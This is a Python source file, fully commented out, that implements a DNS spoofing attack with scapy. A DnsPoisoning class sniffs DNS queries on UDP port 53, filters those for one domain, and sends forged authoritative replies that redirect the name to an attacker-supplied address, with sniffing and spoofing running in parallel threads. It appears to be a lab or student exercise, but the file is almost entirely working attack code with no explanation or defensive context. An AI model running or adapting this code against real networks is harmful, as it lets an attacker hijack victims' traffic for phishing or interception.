# from scapy.all import *
# import time
# import threading
#
# from scapy.layers.dns import DNS, DNSRR, DNSQR
# from scapy.layers.inet import IP, UDP
# from scapy.layers.l2 import Ether
#
# from netfilterqueue import NetfilterQueue
#
# global listening
# global list_of_dns
#
#
# class DnsPoisoning:
#     def __init__(self, mac_attacker, ip_attacker, spoof_website):
#         self.mac_attacker = mac_attacker
#         self.ip_attacker = ip_attacker
#         self.spoof_website = spoof_website
#
#     def create_dns_response(self, pkt):
#         dns_packet = IP() / UDP() / DNS(qd=DNSQR(), an=DNSRR())
#
#         dns_packet[IP].src = pkt[IP].dst
#         dns_packet[IP].dst = pkt[IP].src
#         dns_packet[UDP].dport = pkt[UDP].sport
#         dns_packet[UDP].sport = pkt[UDP].dport
#         dns_packet[DNS].id = pkt[DNS].id
#         dns_packet[DNS].qr = 1
#         dns_packet[DNS].aa = 1
#         dns_packet[DNS].rd = 1
#         dns_packet[DNS].ra = 1
#
#         dns_packet[DNS].qd.qclass = pkt[DNS].qd.qclass
#         # query type
#         dns_packet[DNS].qd.qtype = pkt[DNS].qd.qtype
#         # query name
#         dns_packet[DNS].qd.qname = pkt[DNS].qd.qname
#
#         dns_packet[DNS].an.rrname = pkt[DNS].qd.qname
#         dns_packet[DNS].an.type = pkt[DNS].qd.qtype
#         dns_packet[DNS].an.rclass = pkt[DNS].qd.qclass
#         dns_packet[DNS].an.ttl = 86400
#         dns_packet[DNS].an.rdlen = 4
#         dns_packet[DNS].an.rdata = self.spoof_website
#
#         return dns_packet
#
#     def check_if_dns_request(self, pkt):
#         # for future use the below also checks so that you are not the one that sent a DNS request: so that you do not
#         # spoof yourself!
#         if (len(pkt) > 0 and pkt[0].haslayer(DNS) and pkt[0].haslayer(Ether) and pkt[0][DNS].qr == 0 and pkt[0][
#             DNS].qr == 0 and pkt[0].qd is not None and pkt[0].qd.qname == "hatzwebsite.com."):
#             list_of_dns.append(pkt[0])
#             # and pkt[0][Ether].src !=
#             #                 self.mac_attacker and pkt[0][IP].src != self.ip_attacker
#
#     def spoof_all_dns_responses(self):
#         while listening:
#             if list_of_dns:
#                 r_pkt = self.create_dns_response(list_of_dns.pop())
#                 send(r_pkt)
#
#     def sniff_dns(self):
#         while listening:
#             pkt = sniff(count=1, filter="udp and port 53")
#             self.check_if_dns_request(pkt)
#
#     def execute_poisoning(self):
#         global list_of_dns
#         global listening
#
#         list_of_dns = []
#         listening = True
#
#         thread_sniff_dns = threading.Thread(target=self.sniff_dns)
#         thread_spoof_all_dns_responses = threading.Thread(target=self.spoof_all_dns_responses)
#         thread_spoof_all_dns_responses.start()
#         thread_sniff_dns.start()
#
#
#
#
#
